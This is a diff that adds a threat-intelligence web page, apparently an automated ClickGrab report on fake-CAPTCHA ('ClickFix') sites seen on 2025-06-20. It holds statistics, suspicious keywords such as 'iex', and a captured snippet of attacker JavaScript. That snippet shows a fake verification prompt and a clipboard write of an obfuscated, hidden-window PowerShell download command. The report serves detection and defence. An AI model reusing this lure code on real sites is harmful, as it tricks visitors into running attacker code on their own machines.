@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emerging ClickGrab Campaign: Advanced Analysis of 2025-06-20 Attack Patterns - ClickGrab Threat Intelligence</title>
+    <meta name="description" content="ClickGrab analyzes potential ClickFix and FakeCAPTCHA URLs from URLhaus">
+    <link rel="stylesheet" href="/ClickGrab/assets/css/styles.css">
+    <link rel="icon" href="/ClickGrab/assets/images/favicon.ico" type="image/x-icon">
+    <style>
+        .text-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #FF9900;
+        }
+    </style>
+    
+<style>
+    /* Blog post specific styles */
+    .article-container {
+        max-width: 900px;
+        margin: 0 auto;
+        background: white;
+        border-radius: 12px;
+        box-shadow: var(--shadow-lg);
+        overflow: hidden;
+    }
+    
+    .article-header {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 3rem 2rem;
+        text-align: center;
+        position: relative;
+    }
+    
+    .article-header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="20" cy="20" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="40" r="1.5" fill="rgba(255,255,255,0.1)"/><circle cx="40" cy="60" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="70" cy="80" r="2.5" fill="rgba(255,255,255,0.1)"/></svg>') repeat;
+        pointer-events: none;
+    }
+    
+    .article-header .content {
+        position: relative;
+        z-index: 1;
+    }
+    
+    .article-title {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+        line-height: 1.2;
+        border-bottom: none;
+        color: white;
+    }
+    
+    .article-meta {
+        display: flex;
+        justify-content: center;
+        gap: 2rem;
+        margin-top: 1.5rem;
+        flex-wrap: wrap;
+    }
+    
+    .meta-item {
+        background: rgba(255,255,255,0.2);
+        padding: 0.5rem 1rem;
+        border-radius: 25px;
+        font-size: 0.9rem;
+    }
+    
+    .article-content {
+        padding: 3rem;
+        line-height: 1.8;
+    }
+    
+    .article-content h2 {
+        color: var(--primary-color);
+        margin-top: 3rem;
+        margin-bottom: 1.5rem;
+        font-size: 1.8rem;
+        border-bottom: 2px solid var(--primary-color);
+        padding-bottom: 0.5rem;
+    }
+    
+    .article-content h3 {
+        color: var(--secondary-color);
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+        font-size: 1.4rem;
+    }
+    
+    .article-content h4 {
+        color: var(--text-color);
+        margin-top: 1.5rem;
+        margin-bottom: 0.75rem;
+        font-size: 1.2rem;
+    }
+    
+    .article-content p {
+        margin-bottom: 1.5rem;
+        color: var(--text-color);
+    }
+    
+    .article-content ul, .article-content ol {
+        margin-bottom: 1.5rem;
+        padding-left: 2rem;
+    }
+    
+    .article-content li {
+        margin-bottom: 0.5rem;
+        color: var(--text-color);
+    }
+    
+    .article-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 2rem 0;
+        background: #f8fafc;
+        border-radius: 8px;
+        overflow: hidden;
+    }
+    
+    .article-content th,
+    .article-content td {
+        padding: 1rem;
+        text-align: left;
+        border-bottom: 1px solid #e2e8f0;
+    }
+    
+    .article-content th {
+        background: var(--primary-color);
+        color: white;
+        font-weight: 600;
+    }
+    
+    .article-content tr:hover {
+        background: #f1f5f9;
+    }
+    
+    .article-content pre {
+        background: #1a202c;
+        color: #e2e8f0;
+        padding: 1.5rem;
+        border-radius: 8px;
+        overflow-x: auto;
+        margin: 1.5rem 0;
+        line-height: 1.6;
+    }
+    
+    .article-content code {
+        background: #f1f5f9;
+        color: #e53e3e;
+        padding: 0.25rem 0.5rem;
+        border-radius: 4px;
+        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+        font-size: 0.9em;
+    }
+    
+    .article-content pre code {
+        background: none;
+        color: inherit;
+        padding: 0;
+    }
+    
+    .highlight-box {
+        background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%);
+        border-left: 4px solid #e53e3e;
+        padding: 1.5rem;
+        margin: 2rem 0;
+        border-radius: 0 8px 8px 0;
+    }
+    
+    .info-box {
+        background: linear-gradient(135deg, #ebf8ff 0%, #bee3f8 100%);
+        border-left: 4px solid var(--primary-color);
+        padding: 1.5rem;
+        margin: 2rem 0;
+        border-radius: 0 8px 8px 0;
+    }
+    
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1.5rem;
+        margin: 2rem 0;
+    }
+    
+    .stat-item {
+        background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+        color: white;
+        padding: 1.5rem;
+        border-radius: 8px;
+        text-align: center;
+    }
+    
+    .stat-number {
+        font-size: 2rem;
+        font-weight: 700;
+        display: block;
+        margin-bottom: 0.5rem;
+    }
+    
+    .stat-label {
+        font-size: 0.9rem;
+        opacity: 0.9;
+    }
+    
+    .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 600;
+        margin-bottom: 2rem;
+        transition: all 0.3s ease;
+    }
+    
+    .back-link:hover {
+        transform: translateX(-5px);
+    }
+    
+    .article-footer {
+        background: #f8fafc;
+        padding: 2rem;
+        border-top: 1px solid #e2e8f0;
+        text-align: center;
+    }
+    
+    .share-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 1rem;
+        margin-top: 1rem;
+    }
+    
+    .share-btn-footer {
+        background: var(--primary-color);
+        color: white;
+        padding: 0.75rem 1.5rem;
+        border-radius: 25px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+    }
+    
+    .share-btn-footer:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(37, 99, 235, 0.3);
+        color: white;
+    }
+    
+    @media (max-width: 768px) {
+        .article-content {
+            padding: 1.5rem;
+        }
+        
+        .article-title {
+            font-size: 1.8rem;
+        }
+        
+        .article-meta {
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .stats-grid {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+
+</head>
+<body>
+    <header class="site-header">
+        <div class="container">
+            <div class="logo">
+                <a href="/ClickGrab/">
+                    <img src="/ClickGrab/assets/images/logo.png" alt="ClickGrab" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+                    <span class="text-logo" style="display:none;">CLICKGRAB</span>
+                </a>
+            </div>
+            <nav class="main-nav">
+                <ul>
+                    <li><a href="/ClickGrab/" class="">Home</a></li>
+                    <li><a href="/ClickGrab/analysis.html" class="active">Analysis</a></li>
+                    <li><a href="/ClickGrab/reports.html" class="">Reports</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="site-content">
+        <div class="container">
+            
+<a href="/ClickGrab/analysis.html" class="back-link">← Back to Analysis</a>
+
+<article class="article-container">
+    <header class="article-header">
+        <div class="content">
+            <h1 class="article-title">Emerging ClickGrab Campaign: Advanced Analysis of 2025-06-20 Attack Patterns</h1>
+            <div class="article-meta">
+                <span class="meta-item">📅 Published: June 20, 2025</span>
+                <span class="meta-item">👨‍💻 Author: ClickGrab Threat Intelligence Team</span>
+                <span class="meta-item">📖 12 min read</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="article-content">
+        
+    <div class="analysis-stats-hero">
+        <div class="stats-grid">
+            <div class="stat-card gradient-1">
+                <div class="stat-icon">🔍</div>
+                <div class="stat-value">90</div>
+                <div class="stat-label">Sites Analyzed</div>
+            </div>
+            <div class="stat-card gradient-2">
+                <div class="stat-icon">⚠️</div>
+                <div class="stat-value">11%</div>
+                <div class="stat-label">Detection Rate</div>
+            </div>
+            <div class="stat-card gradient-3">
+                <div class="stat-icon">🛡️</div>
+                <div class="stat-value">0</div>
+                <div class="stat-label">PowerShell Attacks</div>
+            </div>
+            <div class="stat-card gradient-4">
+                <div class="stat-icon">📋</div>
+                <div class="stat-value">2</div>
+                <div class="stat-label">Clipboard Hijacks</div>
+            </div>
+        </div>
+    </div>
+    <h1 id="clickgrab-threat-analysis-report-2025-06-20">ClickGrab Threat Analysis Report - 2025-06-20</h1>
+<p><em>Generated on 2025-06-20 02:37:24</em></p>
+<h2 id="executive-summary">Executive Summary</h2>
+<ul>
+<li><strong>Total sites analyzed</strong>: 90</li>
+<li><strong>Sites with malicious content</strong>: 10</li>
+<li><strong>Unique domains encountered</strong>: 0</li>
+<li><strong>Total URLs extracted</strong>: 0</li>
+<li><strong>PowerShell download attempts</strong>: 0</li>
+<li><strong>Clipboard manipulation instances</strong>: 2</li>
+</ul>
+<h2 id="domain-analysis">Domain Analysis</h2>
+<h3 id="most-frequently-encountered-domains">Most Frequently Encountered Domains</h3>
+<h2 id="url-pattern-analysis">URL Pattern Analysis</h2>
+<h2 id="suspicious-keyword-analysis">Suspicious Keyword Analysis</h2>
+<p><strong>Total Keywords Found</strong>: 92 (13 unique)</p>
+<h3 id="keyword-categories">Keyword Categories</h3>
+<h4 id="social-engineering">Social Engineering</h4>
+<p><em>10 unique keywords</em></p>
+<ul>
+<li><code>robot</code></li>
+<li><code>Captcha</code></li>
+<li><code>Verification ID</code></li>
+<li><code>captcha-iogo</code></li>
+<li><code>Verification</code></li>
+<li><code>CaptchaLoading</code></li>
+<li><code>CAPTCHA</code></li>
+<li><code>CaptchaCheckbox</code></li>
+<li><code>CaptchaListeners</code></li>
+<li><code>captcha-container</code></li>
+</ul>
+<h4 id="verification-text">Verification Text</h4>
+<p><em>1 unique keywords</em></p>
+<ul>
+<li><code>hidden</code></li>
+</ul>
+<h4 id="technical-terms">Technical Terms</h4>
+<p><em>2 unique keywords</em></p>
+<ul>
+<li><code>iex</code></li>
+<li><code>failed_to_retrieve</code></li>
+</ul>
+<h3 id="most-frequent-keywords">Most Frequent Keywords</h3>
+<ul>
+<li><strong>failed_to_retrieve</strong>: 80 occurrences</li>
+<li><strong>Verification ID</strong>: 1 occurrences</li>
+<li><strong>captcha-container</strong>: 1 occurrences</li>
+<li><strong>captcha-iogo</strong>: 1 occurrences</li>
+<li><strong>CAPTCHA</strong>: 1 occurrences</li>
+<li><strong>Captcha</strong>: 1 occurrences</li>
+<li><strong>CaptchaListeners</strong>: 1 occurrences</li>
+<li><strong>CaptchaCheckbox</strong>: 1 occurrences</li>
+<li><strong>CaptchaLoading</strong>: 1 occurrences</li>
+<li><strong>robot</strong>: 1 occurrences</li>
+<li><strong>Verification</strong>: 1 occurrences</li>
+<li><strong>iex</strong>: 1 occurrences</li>
+<li><strong>hidden</strong>: 1 occurrences</li>
+</ul>
+<h3 id="similar-keyword-patterns">Similar Keyword Patterns</h3>
+<p><em>Groups of keywords that appear to be variations of the same theme:</em></p>
+<p><strong>Group 1</strong>: <code>Verification ID</code>, <code>Verification</code></p>
+<p><strong>Group 2</strong>: <code>captcha-container</code>, <code>CaptchaLoading</code></p>
+<p><strong>Group 3</strong>: <code>captcha-iogo</code>, <code>CAPTCHA</code>, <code>Captcha</code></p>
+<h2 id="javascript-obfuscation-analysis">JavaScript Obfuscation Analysis</h2>
+<p><strong>Obfuscation Sophistication Score</strong>: 0/7</p>
+<h3 id="potential-base64-encoded-content">Potential Base64 Encoded Content</h3>
+<p><em>These strings may contain encoded malicious payloads:</em></p>
+<ul>
+<li><code>iVBORw0KGgoAAAANSUhEUgAAAv4AAAMACAYAAABcimNkAAAABm...</code></li>
+</ul>
+<h2 id="clipboard-manipulation-analysis">Clipboard Manipulation Analysis</h2>
+<p>Detected clipboard manipulation in <strong>2</strong> instances.</p>
+<h2 id="clipboard-attack-flow-analysis">Clipboard Attack Flow Analysis</h2>
+<p><strong>Attack Sophistication</strong>: 2/7 components detected
+<strong>Total Technique Instances</strong>: 3</p>
+<h3 id="attack-flow-components">Attack Flow Components</h3>
+<p><em>The following components show how the clipboard attack is executed:</em></p>
+<h4 id="clipboard-operations">Clipboard Operations</h4>
+<p><em>Executing clipboard copy operations</em></p>
+<p><strong>Instances</strong>: 2
+<strong>Examples</strong>: <code>navigator.clipboard</code></p>
+<h4 id="event-handling">Event Handling</h4>
+<p><em>Handling user interactions</em></p>
+<p><strong>Instances</strong>: 1
+<strong>Examples</strong>: <code>addEventListener</code></p>
+<h3 id="malicious-payload-construction">Malicious Payload Construction</h3>
+<p><em>How the final clipboard payload is assembled:</em></p>
+<h4 id="verification-text_1">Verification Text</h4>
+<p><strong>Instances</strong>: 1
+<strong>Examples:</strong>
+- <code>""; } function copyToClipboard() { navigator.clipboard.writeText ("powershell -w h powershell 'cu%%%r%l% %%http%%://... ...tener("click", function(event) { event.preventDefault(); verifyBtn.disabled = true; verifyCaptcha(); }); checkboxBtn.addEventListener("click", function(event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } addCaptchaListeners(); function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function() { showCaptchaLoading(); }, 500) setTimeout(function() { showVerifyWindow(); }, 900) } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function showVerifyWindow() { verifyWindow.style.display = "block"; verifyWindow.style.visibility = "visible"; verifyWindow.style.opacity = "1"; verifyWindow.style.top = checkboxWindow.offsetTop - 80 + "px"; verifyWindow.style.left = checkboxWindow.offsetLeft + 54 + "px"; if (verifyWindow.offsetTop &lt; 5) { verifyWindow.style.top = "5px"; } if (verifyWindow.offsetLeft + verifyWindow.offsetWidth &gt; window.innerWidth - 10) { verifyWindow.style.left = checkboxWindow.offsetLeft - 8 + "px"; } else { verifyWindowArrow.style.top = checkboxWindow.offsetTop + 24 + "px"; verifyWindowArrow.style.left = checkboxWindow.offsetLeft + 45 + "px"; verifyWindowArrow.style.visibility = "visible"; verifyWindowArrow.style.opacity = "1"; } } function closeVerifyWindow() { verifyWindow.style.display = "none"; verifyWindow.style.visibility = "hidden"; verifyWindow.style.opacity = "0"; verifyWindowArrow.style.visibility = "hidden"; verifyWindowArrow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; verifyBtn.disabled = false; } function isVerifyWindowVisible() { return verifyWindow.style.display !== "none" &amp;&amp; verifyWindow.style.display !== ""; } function copyToClipboard() { navigator.clipboard.writeText... ...lt="" id="fkrc-spinner"&gt; &lt;/div&gt; &lt;div id="fkrc-verifywin-window" class="fkrc-verifywin-window"&gt; &lt;div class="fkrc-verifywin-container"&gt; &lt;header class="fkrc-verifywin-header"&gt; &lt;span class="fkrc-verifywin-header-text-medium fkrc-m-p fkrc-block"&gt;To verify your request&lt;/span&gt; &lt;span class="fkrc-verifywin-header-text-big fkrc-m-p fkrc-block"&gt;follow the instructions below&lt;/span&gt; &lt;/header&gt; &lt;main class="fkrc-verifywin-main"&gt; &lt;div class="chrome-box"&gt; &lt;div class="chrome-content"&gt; &lt;ul&gt; &lt;li&gt;Press the Windows Button &lt;img src='data:image/jpeg;base64,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